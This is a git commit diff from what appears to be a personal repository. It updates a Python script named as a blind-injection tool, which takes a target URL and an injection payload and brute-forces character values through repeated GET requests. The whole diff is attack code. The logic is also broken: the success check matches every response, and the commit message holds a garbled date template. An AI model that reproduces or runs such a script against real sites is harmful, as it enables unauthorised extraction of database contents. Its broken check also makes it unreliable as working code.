d62c6042bd033a474a50edb263bbfe1cd6128afa
whb54012 <1226844928@qq.com>
2026-07-27 10:39:31 +0000

    自动提交：更新 ${2026/7/27 18:39ilenPM39e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -9,11 +9,11 @@ result2=int(input("输入查找长度"))
 url = input("输入url及注入点")
 data=input("输入注入语句")
 def fun(url,result,result2):
-    for i in result2:
+    for i in range(result2):
         try:
-            reponse=requests.get(url+data.format(result,result2))
+            reponse=requests.get(url+data.format(result,i))
             if '' in reponse.text:
-                print(result,url+format(result,result2),chr(result2))
+                print(result,url+format(result,i),chr(i))
                 break
         except:continue
     return
